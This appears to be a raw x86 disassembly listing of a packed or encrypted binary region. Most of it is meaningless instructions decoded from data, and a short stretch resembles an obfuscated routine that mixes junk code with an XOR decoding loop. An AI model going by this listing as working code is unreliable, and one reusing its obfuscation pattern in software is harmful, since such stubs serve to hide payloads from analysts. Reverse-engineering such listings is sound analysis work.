  4048b9:	adc    BYTE PTR [ecx],al
  4048bb:	hlt    
  4048bc:	mov    edx,0x418f1724
  4048c1:	outs   dx,DWORD PTR ds:[esi]
  4048c2:	cld    
  4048c3:	retf   0x703b
  4048c6:	xchg   esp,eax
  4048c7:	(bad)  [edi+0x1948621d]
  4048cd:	push   edi
  4048ce:	ficom  DWORD PTR [ecx]
  4048d0:	or     dl,BYTE PTR [esi-0x25]
  4048d3:	mov    al,ds:0xc785a0aa
  4048d8:	mov    BYTE PTR ds:0x47cbe903,dl
  4048de:	mov    dl,0x90
  4048e0:	icebp  
  4048e1:	sbb    BYTE PTR [eax+0x10],0x7
  4048e5:	push   edx
  4048e6:	pop    edx
  4048e7:	or     BYTE PTR [edi+ebp*1],ch
  4048ea:	mov    edx,0x7deb010b
  4048ef:	add    BYTE PTR [esi+0x4820d057],ah
  4048f5:	xor    al,0x1a
  4048f7:	mov    dl,0x1f
  4048f9:	mov    esp,0x79198710
  4048fe:	fsubr  st,st(0)
  404900:	sub    ah,BYTE PTR [edx+0x15a9c172]
  404906:	fdiv   DWORD PTR [eax-0x80]
  404909:	mov    al,0xd6
  40490b:	xchg   esp,eax
  40490c:	mov    al,ds:0xd6ed2eb5
  404911:	scas   al,BYTE PTR es:[edi]
  404912:	icebp  
  404913:	(bad)  
  404914:	ins    DWORD PTR es:[edi],dx
  404915:	fisttp DWORD PTR [ebx-0x2ecc0bbb]
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	arpl   WORD PTR [edx+0x21c9f536],bx
  4049c1:	jo     0x404a33
  4049c3:	cmp    eax,0x6370707d
  4049c8:	lods   eax,DWORD PTR ds:[esi]
  4049c9:	push   eax
  4049ca:	adc    edx,DWORD PTR [edx]
  4049cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049cd:	add    esi,eax
  4049cf:	cmp    eax,0x54196cbd
  4049d4:	outs   dx,BYTE PTR ds:[esi]
  4049d5:	(bad)  
  4049d6:	xchg   esi,eax
  4049d7:	imul   edx,DWORD PTR [esi+0x4e],0x6e89f25a
  4049de:	push   eax
  4049df:	push   0xce195694
  4049e4:	dec    esi
  4049e5:	in     al,0x80
  4049e7:	lea    ebx,ds:0x4ad57834
  4049ed:	nop
  4049ee:	xchg   bh,dl
  4049f0:	mov    cl,0xc2
  4049f2:	stc    
  4049f3:	cwde   
  4049f4:	out    0x66,eax
  4049f6:	pop    ecx
  4049f7:	mov    DWORD PTR [eax],ecx
  4049f9:	mov    cl,0xa3
  4049fb:	add    dh,bl
  4049fd:	xor    cl,dh
  4049ff:	add    ebp,ebx
  404a01:	lods   al,BYTE PTR ds:[esi]
  404a02:	pop    es
  404a03:	xor    esp,esp
  404a05:	adc    DWORD PTR [ecx],eax
  404a07:	sbb    edx,DWORD PTR [ebp+0x2156a362]
  404a0d:	xor    al,0x6e
  404a0f:	je     0x404a62
  404a11:	inc    esi
  404a12:	add    bl,BYTE PTR [ebx]
  404a14:	mov    WORD PTR [edi-0x6b],?
  404a17:	shl    BYTE PTR [edx-0x76],0x69
  404a1b:	mov    al,0x7d
  404a1d:	icebp  
  404a1e:	push   ebx
  404a1f:	cmp    eax,0x1be7f47c
  404a24:	xor    al,0xc5
  404a26:	cmp    bh,BYTE PTR [ecx+eax*8]
  404a29:	aad    0x4c
  404a2b:	inc    ebx
  404a2c:	ja     0x4049f6
  404a2e:	das    
  404a2f:	add    eax,0x270251cd
  404a34:	xor    edi,DWORD PTR [edx-0x7df47b3b]
  404a3a:	lock in eax,dx
  404a3c:	enter  0x1e20,0xe6
  404a40:	inc    ebp
  404a41:	pop    ds
  404a42:	push   esi
  404a43:	add    edx,ebp
  404a45:	inc    esi
  404a46:	mov    dh,0xe7
  404a48:	jl     0x4049e2
  404a4a:	push   edx
  404a4b:	pop    ebx
  404a4c:	dec    ecx
  404a4d:	cmp    DWORD PTR [ebx],0x23
  404a50:	xor    al,0x62
  404a52:	(bad)  
  404a53:	sbb    al,BYTE PTR [esi-0x59]
  404a56:	sub    BYTE PTR [eax],ch
  404a58:	or     eax,0x451ed77
  404a5d:	or     dh,BYTE PTR [edi-0x195b0b5a]
  404a63:	xchg   esi,eax
  404a64:	mov    edi,0xe6aec563
  404a69:	mov    bh,0xed
  404a6b:	test   al,0xb9
  404a6d:	jg     0x404ac8
  404a6f:	push   esp
  404a70:	rol    ah,0x81
  404a73:	xchg   ecx,eax
  404a74:	mov    esi,0xb4d59fdd
  404a79:	lods   al,BYTE PTR ds:[esi]
  404a7a:	dec    ecx
  404a7b:	jle    0x404aed
  404a7d:	adc    BYTE PTR [edi-0x48b2fafe],dh
  404a83:	mov    BYTE PTR [esi],dh
  404a85:	das    
  404a86:	add    dl,ah
  404a88:	add    ah,BYTE PTR fs:[ecx-0xb]
  404a8c:	clc    
  404a8d:	xchg   edx,eax
  404a8e:	adc    dh,bh
  404a90:	sub    edx,0xfa387bbc
  404a96:	(bad)  
  404a97:	jmp    0x404a6a
  404a99:	(bad)  
  404a9a:	sahf   
  404a9b:	dec    esi
  404a9c:	dec    eax
  404a9d:	data16 cmp BYTE PTR ds:[eax-0x164dd40b],ch
  404aa5:	cmc    
  404aa6:	mov    esp,0xd6cd2b81
  404aab:	out    dx,eax
  404aac:	fldcw  WORD PTR [ecx-0x8aa9860]
  404ab2:	jb     0x404a60
  404ab4:	jge    0x404b30
  404ab6:	jo     0x404ac6
  404ab8:	push   es
  404ab9:	and    al,0x66
  404abb:	add    edx,DWORD PTR [esi-0x47]
  404abe:	aam    0x52
  404ac0:	inc    edi
  404ac1:	pop    esi
  404ac2:	(bad)  
  404ac3:	clc    
  404ac4:	ins    BYTE PTR es:[edi],dx
  404ac5:	dec    esp
  404ac6:	es cmp al,0x74
  404ac9:	fsubr  st,st(5)
  404acb:	adc    BYTE PTR [ebx],ah
  404acd:	mov    al,ds:0x84605275
  404ad2:	mov    DWORD PTR ds:0x38967169,ebp
  404ad8:	mov    ah,0xed
  404ada:	or     BYTE PTR [esi-0x16],ah
  404add:	dec    ebp
  404ade:	dec    edi
  404adf:	xchg   esp,eax
  404ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ae1:	mov    DWORD PTR fs:[esi+ebx*2+0x50],eax
  404ae6:	(bad)  
  404ae7:	stc    
  404ae8:	lea    edi,[ebx+0x68]
  404aeb:	out    dx,eax
  404aec:	xchg   ebp,eax
  404aed:	adc    ebp,edi
  404aef:	lods   eax,DWORD PTR ds:[esi]
  404af0:	jmp    0x404a78
  404af2:	shl    DWORD PTR [esi],0x34
  404af5:	stos   DWORD PTR es:[edi],eax
  404af6:	inc    ebx
  404af7:	mov    dl,0x54
  404af9:	jbe    0x404b2e
  404afb:	sub    cl,BYTE PTR [ecx]
  404afd:	cmp    ah,bh
  404aff:	in     eax,0x1f
  404b01:	in     al,0x71
  404b03:	xor    eax,0x9823afda
  404b08:	mov    ch,BYTE PTR [ecx]
  404b0a:	ja     0x404b35
  404b0c:	pop    ss
  404b0d:	xchg   esi,eax
  404b0e:	retf   0xefa9
  404b11:	gs jp  0x404a94
  404b14:	dec    eax
  404b15:	and    eax,0x66a8474d
  404b1a:	enter  0x1d94,0x8c
  404b1e:	ret    0xc195
  404b21:	xchg   edx,eax
  404b22:	sub    bh,bh
  404b24:	pusha  
  404b25:	lahf   
  404b26:	jmp    0x6614:0x91f3e509
  404b2d:	fcmovb st,st(2)
  404b2f:	sbb    DWORD PTR [ebp+0x12],ecx
  404b32:	js     0x404b6d
  404b34:	sbb    DWORD PTR [ecx+0x1f],ecx
  404b37:	jg     0x404b77
  404b39:	mov    esi,0x172a8e20
  404b3e:	mov    ds:0xabdbb279,eax
  404b43:	dec    eax
  404b44:	push   es
  404b45:	mov    al,ds:0x61db54f1
  404b4a:	mov    ds:0xb785bbd3,eax
  404b4f:	mov    bl,0xcf
  404b51:	std    
  404b52:	sahf   
  404b53:	nop
  404b54:	(bad)  
  404b55:	(bad)  
  404b56:	clc    
  404b57:	retf   0x1d85
  404b5a:	adc    ch,ch
  404b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b5d:	ret    0x65b6
  404b60:	aad    0xd
  404b62:	sbb    dl,ch
  404b64:	mov    cl,0xc5
  404b66:	sti    
  404b67:	push   0x67
  404b69:	nop
  404b6a:	jnp    0x404b8e
  404b6c:	push   esp
  404b6d:	retf   0x3191
  404b70:	mov    esp,0xf0c38715
  404b75:	mov    eax,0x403cf80a
  404b7a:	aad    0xac
  404b7c:	fisubr DWORD PTR [eax+0x71]
  404b7f:	sahf   
  404b80:	mov    ds:0x96cbc27f,eax
  404b85:	sub    BYTE PTR [bx+0x31],cl
  404b89:	push   edx
  404b8a:	ins    BYTE PTR es:[edi],dx
  404b8b:	pop    esp
  404b8c:	xchg   DWORD PTR [esi],eax
  404b8e:	sub    ecx,DWORD PTR [edx]
  404b90:	sub    DWORD PTR [ecx-0x654b0cdf],ebp
  404b96:	lahf   
  404b97:	push   ebp
  404b98:	cwde   
  404b99:	je     0x404bd2
  404b9b:	rcr    DWORD PTR [eax+0x57],cl
  404b9e:	mov    ch,0x33
  404ba0:	ds xchg ebx,eax
  404ba2:	push   eax
  404ba3:	cli    
  404ba4:	bound  edi,QWORD PTR [edi+0x2d]
  404ba7:	loopne 0x404b99
  404ba9:	sub    al,0xf3
  404bab:	(bad)  
  404bac:	nop
  404bad:	mov    esp,0x563a14f4
  404bb2:	and    ch,BYTE PTR [ebx-0x4c]
  404bb5:	xlat   BYTE PTR ds:[ebx]
  404bb6:	fild   WORD PTR [eax-0x6b]
  404bb9:	xor    al,bl
  404bbb:	xchg   edx,eax
  404bbc:	adc    eax,0xc9ed5951
  404bc1:	nop
  404bc2:	cli    
  404bc3:	add    eax,0x4a1d615a
  404bc8:	add    DWORD PTR [edx],edx
  404bca:	inc    ebp
  404bcb:	test   BYTE PTR [ecx+0x47335fcb],ah
  404bd1:	daa    
  404bd2:	sbb    DWORD PTR [edi+eax*8-0x6e41e7e6],ecx
  404bd9:	(bad)  
  404bdb:	(bad)
  404bde:	sub    eax,0xcff4e142
  404be3:	fdivr  QWORD PTR [ebp-0x7f]
  404be6:	in     eax,dx
  404be7:	test   DWORD PTR [ebx-0x66],esi
  404bea:	pop    esp
  404beb:	add    al,0x14
  404bed:	push   edi
  404bee:	mov    esi,0x95ca83a8
  404bf3:	rcl    BYTE PTR [edx],1
  404bf5:	pop    esi
  404bf6:	ins    BYTE PTR es:[edi],dx
  404bf7:	inc    edi
  404bf8:	mov    BYTE PTR [ebp-0x8dbc81],bl
  404bfe:	aad    0xe2
  404c00:	ror    DWORD PTR [eax-0x69ca66e4],0x3f
  404c07:	inc    ecx
  404c08:	xor    cl,BYTE PTR [ecx+0x68]
  404c0b:	popa   
  404c0c:	adc    al,0x88
  404c0e:	mov    al,0x4e
  404c10:	cmp    BYTE PTR [ecx+0x42],ah
  404c13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c14:	pop    eax
  404c15:	dec    edi
  404c16:	xlat   BYTE PTR ds:[ebx]
  404c17:	cmp    dl,BYTE PTR [esi]
  404c19:	inc    ecx
  404c1a:	hlt    
  404c1b:	add    ebp,DWORD PTR [ebx-0x43]
  404c1e:	sbb    cl,BYTE PTR [ebx+ebx*1-0x2a]
  404c22:	stos   DWORD PTR es:[edi],eax
  404c23:	lods   al,BYTE PTR ds:[esi]
  404c24:	adc    eax,0x3f9fb94a
  404c29:	dec    esp
  404c2a:	inc    esi
  404c2b:	shufps xmm4,xmm7,0xa
  404c2f:	call   0x207c38b0
  404c34:	mov    bh,0xef
  404c36:	cdq    
  404c37:	scas   eax,DWORD PTR es:[edi]
  404c38:	test   DWORD PTR es:[edi+0x48],edx
  404c3c:	mov    ebx,0x6a1b2da1
  404c41:	ffreep st(1)
  404c43:	pop    ebp
  404c44:	movzx  ecx,dx
  404c47:	out    dx,al
  404c48:	mov    esi,0x7666df99
  404c4d:	inc    edi
  404c4e:	adc    al,0xf0
  404c50:	in     al,0xb2
  404c52:	fsubr  QWORD PTR [eax]
  404c54:	arpl   WORD PTR [eax+0xe],bp
  404c57:	jmp    0x404c4d
  404c59:	loope  0x404bdc
  404c5b:	or     eax,0x3458487f
  404c60:	pop    edx
  404c61:	aad    0xe8
  404c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c64:	push   edx
  404c65:	shl    BYTE PTR [ebx+0x1bda45d],1
  404c6b:	dec    edx
  404c6c:	hlt    
  404c6d:	push   cs
  404c6e:	cdq    
  404c6f:	xchg   ecx,eax
  404c70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c71:	xor    ah,dh
  404c73:	add    al,0x3f
  404c75:	mov    ch,0xc7
  404c77:	jecxz  0x404c51
  404c79:	out    dx,eax
  404c7a:	cmp    DWORD PTR [edx],0xffffffb5
  404c7d:	mov    ebp,0x1b69400b
  404c82:	xor    eax,0xcb5df111
  404c87:	xor    dh,BYTE PTR [esi+0x24]
  404c8a:	dec    edi
  404c8b:	xacquire xchg DWORD PTR [esi],edi
  404c8e:	mov    BYTE PTR [edi+ecx*2],dh
  404c91:	adc    DWORD PTR [eax-0x34],ebp
  404c94:	sbb    BYTE PTR [ecx-0xbc3f371],ch
  404c9a:	(bad)  
  404c9b:	shr    edx,cl
  404c9d:	cdq    
  404c9e:	mov    al,0xae
  404ca0:	std    
  404ca1:	test   esi,edx
  404ca3:	cmp    eax,0xd9b0fd82
  404ca8:	clc    
  404ca9:	fbstp  TBYTE PTR [edi+0x4e011f3c]
  404caf:	add    eax,0xa78c77c7
  404cb4:	popf   
  404cb5:	cmp    dl,al
  404cb7:	mov    DWORD PTR [ecx-0xab2ca2],ebp
  404cbd:	dec    edi
  404cbe:	and    esi,DWORD PTR [eax+0x35b91bbe]
  404cc4:	inc    edx
  404cc5:	pop    ss
  404cc6:	dec    ebp
  404cc7:	and    bl,bh
  404cc9:	out    0x25,al
  404ccb:	pusha  
  404ccc:	les    ecx,FWORD PTR [eax+0x207cdb46]
  404cd2:	lods   eax,DWORD PTR ds:[esi]
  404cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cd4:	je     0x404c7e
  404cd6:	push   cs
  404cd7:	out    dx,al
  404cd8:	sub    esp,ebp
  404cda:	shl    esi,1
  404cdc:	push   edx
  404cdd:	popf   
  404cde:	es test ch,dl
  404ce1:	sbb    eax,0xdb9ea409
  404ce6:	sub    ch,bh
  404ce8:	in     eax,dx
  404ce9:	repnz fs out 0x5c,eax
  404ced:	inc    ebx
  404cee:	pop    edx
  404cef:	shl    DWORD PTR [edi-0x7d],0x1f
  404cf3:	jne    0x404d5f
  404cf5:	sbb    BYTE PTR [edi+0x76cd03ab],bh
  404cfb:	shl    BYTE PTR ds:0xd5143aac,0x2c
  404d02:	jecxz  0x404d67
  404d04:	jbe    0x404ccb
  404d06:	cli    
  404d07:	jo     0x404d86
  404d09:	(bad)  
  404d0a:	add    eax,edi
  404d0c:	mov    DWORD PTR ds:0x42e6ff,0xe58
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e6eb,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x3d]
  404d39:	dec    DWORD PTR [ebx-0x35]
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xb170707d
  404d45:	outs   dx,BYTE PTR ds:[esi]
  404d46:	js     0x404d4b
  404d48:	ja     0x404cfa
  404d4a:	(bad)  
  404d4b:	cli    
  404d4c:	test   eax,0xc13ba1da
  404d51:	pop    esi
  404d52:	mul    edi
  404d54:	repnz es dec edi
  404d57:	cli    
  404d58:	adc    edi,0x69d13f28
  404d5e:	and    bl,bl
  404d60:	jge    0x404ddf
  404d62:	imul   ebp,ebx,0x59
  404d65:	imul   ebx,DWORD PTR [esi-0x5c09ea68],0xd5c7e4ae
  404d6f:	add    cl,BYTE PTR [ebp+0xc9e621]
  404d75:	dec    esp
  404d76:	push   ebx
  404d77:	jnp    0x404d04
  404d79:	fcmove st,st(0)
  404d7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d7c:	xchg   esi,eax
  404d7d:	inc    ebp
  404d7e:	mov    edx,0xe7297faa
  404d83:	das    
  404d84:	and    dh,BYTE PTR [ebp-0x53]
  404d87:	sbb    al,0x98
  404d89:	les    edi,FWORD PTR [eax+ebx*1+0x4b]
  404d8d:	adc    al,0xcb
  404d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d90:	fild   QWORD PTR [ebx-0x6]
  404d93:	arpl   WORD PTR [eax],sp
  404d95:	stc    
  404d96:	adc    DWORD PTR [ecx+0x9c3e537],0xc92cef6c
  404da0:	mov    esp,DWORD PTR [eax+0x47]
  404da3:	xor    eax,0xd60e0398
  404da8:	jecxz  0x404df9
  404daa:	outs   dx,DWORD PTR ds:[esi]
  404dab:	sub    eax,0xa97b9d4b
  404db0:	jae    0x404d33
  404db2:	ins    BYTE PTR es:[edi],dx
  404db3:	jo     0x404e04
  404db5:	into   
  404db6:	mov    ebx,ds
  404db8:	addr16 sbb bh,bh
  404dbb:	mov    ds:0xef54d437,al
  404dc0:	test   al,0xe2
  404dc2:	sbb    bl,ah
  404dc4:	adc    al,0x8c
  404dc6:	sbb    DWORD PTR [edi+0x66838e3d],ecx
  404dcc:	je     0x404d80
  404dce:	dec    ebx
  404dcf:	out    dx,al
  404dd0:	xor    DWORD PTR [edx],0xfffffff8
  404dd3:	mov    bh,BYTE PTR [ecx+0x4a1a6384]
  404dd9:	sbb    DWORD PTR [edi-0x2b],esp
  404ddc:	adc    BYTE PTR [ebx-0x37],bl
  404ddf:	xor    bl,BYTE PTR [ecx+0x9b5b92c]
  404de5:	push   ebp
  404de6:	jecxz  0x404dec
  404de8:	mov    cl,cl
  404dea:	pop    eax
  404deb:	retf   0x542f
  404dee:	nop
  404def:	xchg   ebp,eax
  404df0:	cmp    BYTE PTR [esp+ebp*4],ch
  404df3:	hlt    
  404df4:	enter  0xdfbc,0x56
  404df8:	cld    
  404df9:	sub    dl,BYTE PTR [edx-0x13]
  404dfc:	cwde   
  404dfd:	mov    edi,0xc0d4c568
  404e02:	mov    BYTE PTR [edi+0x1d],al
  404e05:	pop    es
  404e06:	fbld   TBYTE PTR [eax-0x721ec3d4]
  404e0c:	sub    eax,0xe89704c8
  404e11:	mov    WORD PTR [edi+0x19],?
  404e14:	dec    esi
  404e15:	imul   ebp,DWORD PTR [ecx-0x1a],0x12e8bce6
  404e1c:	in     al,dx
  404e1d:	pusha  
  404e1e:	dec    esp
  404e1f:	sbb    eax,0x1b2776af
  404e24:	mov    esi,0x37b42942
  404e29:	lfs    edx,FWORD PTR [ecx]
  404e2c:	or     al,0x6d
  404e2e:	add    eax,0x96b40ab
  404e33:	mov    al,ds:0x717a053
  404e38:	and    dl,BYTE PTR [esp+edx*1-0x2c]
  404e3c:	add    DWORD PTR [edi-0x33],ecx
  404e3f:	ror    DWORD PTR [esi+edi*8],1
  404e42:	scas   al,BYTE PTR es:[edi]
  404e43:	mov    BYTE PTR [ecx],ch
  404e45:	xchg   ecx,eax
  404e46:	(bad)
  404e4a:	cli    
  404e4b:	inc    esi
  404e4c:	ja     0x404e4b
  404e4e:	leave  
  404e4f:	xchg   ebp,eax
  404e50:	test   BYTE PTR [ecx],al
  404e52:	gs es dec edx
  404e55:	jb     0x404ec5
  404e57:	and    al,bl
  404e59:	ret    
  404e5a:	or     edi,DWORD PTR [ebx+0x38]
  404e5d:	fstp   TBYTE PTR ds:0xdcc493f7
  404e63:	test   ebp,esp
  404e65:	xor    eax,0xa96aadad
  404e6a:	sbb    ebp,DWORD PTR [edx-0x28]
  404e6d:	mov    eax,ds:0x51503f44
  404e72:	out    dx,al
  404e73:	jne    0x404ee7
  404e75:	ins    BYTE PTR es:[edi],dx
  404e76:	ror    BYTE PTR [edi],cl
  404e78:	dec    ebp
  404e79:	out    0xe0,eax
  404e7b:	xchg   BYTE PTR [esi],bl
  404e7d:	mov    edx,0x252b6113
  404e82:	dec    ebp
  404e83:	sub    eax,0x9e6e90aa
  404e88:	xor    eax,DWORD PTR [ecx]
  404e8a:	sub    dl,BYTE PTR [eax+0x2b94000c]
  404e90:	loop   0x404e9c
  404e92:	pusha  
  404e93:	add    BYTE PTR [ebx+0x50],dl
  404e96:	js     0x404ef7
  404e98:	adc    eax,0x59f79e50
  404e9d:	cmp    al,0xa
  404e9f:	ja     0x404e3b
  404ea1:	fcom   QWORD PTR [ebp-0x377fcd02]
  404ea7:	data16 test al,0x45
  404eaa:	pop    ebp
  404eab:	cmp    esp,DWORD PTR [ecx]
  404ead:	cld    
  404eae:	pop    ebx
  404eaf:	push   esp
  404eb0:	mov    ?,WORD PTR [esp+esi*1+0x3a]
  404eb4:	int    0x37
  404eb6:	cld    
  404eb7:	outs   dx,BYTE PTR ds:[esi]
  404eb8:	lods   eax,DWORD PTR ds:[esi]
  404eb9:	adc    DWORD PTR [edi-0x18],esi
  404ebc:	bound  eax,QWORD PTR [edx+0x32]
  404ebf:	hlt    
  404ec0:	add    edi,eax
  404ec2:	push   esp
  404ec3:	repz fs out dx,al
  404ec6:	sub    al,0x62
  404ec8:	shr    BYTE PTR [edx+0x958584a],cl
  404ece:	rol    ebx,1
  404ed0:	rol    DWORD PTR fs:[eax+0x2e553bfd],1
  404ed7:	sahf   
  404ed8:	xchg   ebp,eax
  404ed9:	mov    ds:0x7acc3831,eax
  404ede:	dec    edi
  404edf:	out    0x8a,al
  404ee1:	sub    al,bh
  404ee3:	sbb    al,0x6b
  404ee5:	std    
  404ee6:	(bad)  
  404ee7:	out    dx,eax
  404ee8:	pop    edx
  404ee9:	popf   
  404eea:	sbb    al,0x55
  404eec:	aam    0x15
  404eee:	pop    esi
  404eef:	adc    ah,BYTE PTR [eax]
  404ef1:	mov    edx,0xcfaa3221
  404ef6:	outs   dx,DWORD PTR ds:[esi]
  404ef7:	add    eax,0x4af53db3
  404efc:	xchg   esi,eax
  404efd:	dec    ecx
  404efe:	fild   QWORD PTR [edi]
  404f00:	jo     0x404ede
  404f02:	push   esi
  404f03:	xchg   ebp,eax
  404f04:	pop    eax
  404f05:	stos   DWORD PTR es:[edi],eax
  404f06:	jl     0x404eb2
  404f08:	lds    esi,FWORD PTR [edx]
  404f0a:	push   eax
  404f0b:	push   ebp
  404f0c:	pop    ebx
  404f0d:	dec    cl
  404f0f:	push   esp
  404f10:	mov    esp,gs
  404f12:	ret    
  404f13:	ss pop ds
  404f15:	pusha  
  404f16:	mov    cl,0x8c
  404f18:	jl     0x404ef4
  404f1a:	and    al,0xda
  404f1c:	jns    0x404f3b
  404f1e:	lds    edi,FWORD PTR [edi-0x6e0111b3]
  404f24:	sub    al,0x86
  404f26:	pop    edi
  404f27:	lds    edi,FWORD PTR [esp+esi*2+0x24]
  404f2b:	stos   BYTE PTR es:[edi],al
  404f2c:	dec    eax
  404f2d:	pop    ebx
  404f2e:	mov    eax,ds:0x2200ad3a
  404f33:	aaa    
  404f34:	in     al,dx
  404f35:	mov    dh,BYTE PTR [edi-0x7e5f1599]
  404f3b:	xchg   ch,cl
  404f3d:	mov    gs,eax
  404f3f:	or     BYTE PTR [eax+ebp*1],dl
  404f42:	fbld   TBYTE PTR [esi-0x1]
  404f45:	and    dl,BYTE PTR [esi-0x12f49269]
  404f4b:	sub    BYTE PTR [ecx-0x6ebebb0c],al
  404f51:	popf   
  404f52:	shl    DWORD PTR [ebx+0x0],cl
  404f55:	(bad)  
  404f56:	cli    
  404f57:	aam    0x8d
  404f59:	sar    DWORD PTR [edi+0x23],0xd1
  404f5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f5e:	xchg   ecx,eax
  404f5f:	fild   QWORD PTR [ecx]
  404f61:	add    edi,DWORD PTR [edi]
  404f63:	pop    ecx
  404f64:	or     BYTE PTR [edx],cl
  404f66:	aam    0x5c
  404f68:	xchg   esp,eax
  404f69:	push   es
  404f6a:	or     bh,bl
  404f6c:	bound  edx,QWORD PTR [ecx+ebx*1-0x65]
  404f70:	outs   dx,DWORD PTR ds:[esi]
  404f71:	push   edi
  404f72:	and    al,0xac
  404f74:	push   ebx
  404f75:	push   0x8553177a
  404f7a:	or     BYTE PTR [ecx-0x41],bh
  404f7d:	ins    DWORD PTR es:[edi],dx
  404f7e:	xchg   esp,eax
  404f7f:	lods   eax,DWORD PTR ds:[esi]
  404f80:	jg     0x404f7e
  404f82:	pop    edi
  404f83:	jne    0x404f1e
  404f85:	in     eax,0xef
  404f87:	aam    0xb6
  404f89:	ror    DWORD PTR gs:[edx+0x22],1
  404f8d:	sub    dh,BYTE PTR [esp+ebx*4-0x20dc6018]
  404f94:	aaa    
  404f95:	es cs sahf 
  404f98:	leave  
  404f99:	rol    edi,cl
  404f9b:	jmp    0xf0ca:0x71d9c85d
  404fa2:	scas   eax,DWORD PTR es:[edi]
  404fa3:	pop    ebp
  404fa4:	sbb    edi,DWORD PTR [esi]
  404fa6:	dec    edx
  404fa7:	les    esp,FWORD PTR [edi-0x72]
  404faa:	adc    eax,0x416339fa
  404faf:	inc    eax
  404fb0:	lods   eax,DWORD PTR ds:[esi]
  404fb1:	pop    es
  404fb2:	cmp    al,0x11
  404fb4:	aam    0x6f
  404fb6:	leave  
  404fb7:	pop    es
  404fb8:	ds jg  0x404f48
  404fbb:	hlt    
  404fbc:	lea    ebp,[ebx+0x45]
  404fbf:	mov    cl,0xc4
  404fc1:	xchg   BYTE PTR [edx],dl
  404fc3:	out    dx,al
  404fc4:	inc    esi
  404fc5:	mov    edx,0xd4c1cd71
  404fca:	retf   
  404fcb:	fisub  WORD PTR ds:0x4c522546
  404fd1:	idiv   BYTE PTR ds:0x53f21c1c
  404fd7:	test   al,0x2
  404fd9:	nop
  404fda:	add    ecx,DWORD PTR [ecx-0x343c6a6b]
  404fe0:	aas    
  404fe1:	push   es
  404fe2:	loop   0x405032
  404fe4:	pop    edi
  404fe5:	js     0x40500b
  404fe7:	pop    eax
  404fe8:	aaa    
  404fe9:	fwait
  404fea:	jns    0x404fa5
  404fec:	add    DWORD PTR [edx-0x3d1c618b],eax
  404ff2:	int3   
  404ff3:	or     esp,DWORD PTR [edx+0x33b28c27]
  404ff9:	cmp    BYTE PTR [ebx+0x68362764],dh
  404fff:	ret    0x1aee
  405002:	loope  0x404fff
  405004:	jbe    0x404f9f
  405006:	or     DWORD PTR [edx+0x3be76a4b],edi
  40500c:	mov    al,ds:0xb5269dbb
  405011:	ud0    esp,DWORD PTR [edi-0x63]
  405015:	push   eax
  405016:	mov    edi,0x58e1affe
  40501b:	popf   
  40501c:	(bad)  
  40501d:	test   DWORD PTR [ebx+0x405bea58],0x9ba78991
  405027:	shl    BYTE PTR [edx+0x48],1
  40502a:	ficomp WORD PTR [ecx+0x33086c0d]
  405030:	cmc    
  405031:	add    cl,BYTE PTR [ebp-0x2c87835a]
  405037:	sbb    eax,0x3e09c941
  40503c:	xor    BYTE PTR [eax-0x5c72641b],0xf2
  405043:	add    al,0x4
  405045:	adc    ebp,0x7eea3563
  40504b:	leave  
  40504c:	ja     0x4050c3
  40504e:	data16 aam 0x6b
  405051:	in     eax,0x6a
  405053:	cmp    BYTE PTR [edi+ecx*8-0x17da38b0],dh
  40505a:	loopne 0x405054
  40505c:	fcom   DWORD PTR [edi-0x3c]
  40505f:	xchg   edi,eax
  405060:	dec    esi
  405061:	pop    esp
  405062:	or     bl,BYTE PTR [esi]
  405064:	out    dx,al
  405065:	retf   0x824
  405068:	(bad)  
  405069:	sub    bh,BYTE PTR [edx]
  40506b:	cdq    
  40506c:	cmc    
  40506d:	inc    ebx
  40506e:	dec    ebp
  40506f:	jb     0x40502e
  405071:	sbb    ecx,ebp
  405073:	call   0x7ef1:0xd1eda91f
  40507a:	sub    eax,0x41e902a2
  40507f:	lods   al,BYTE PTR ds:[esi]
  405080:	and    esi,ebx
  405082:	xchg   esp,eax
  405083:	push   edx
  405084:	adc    esi,edi
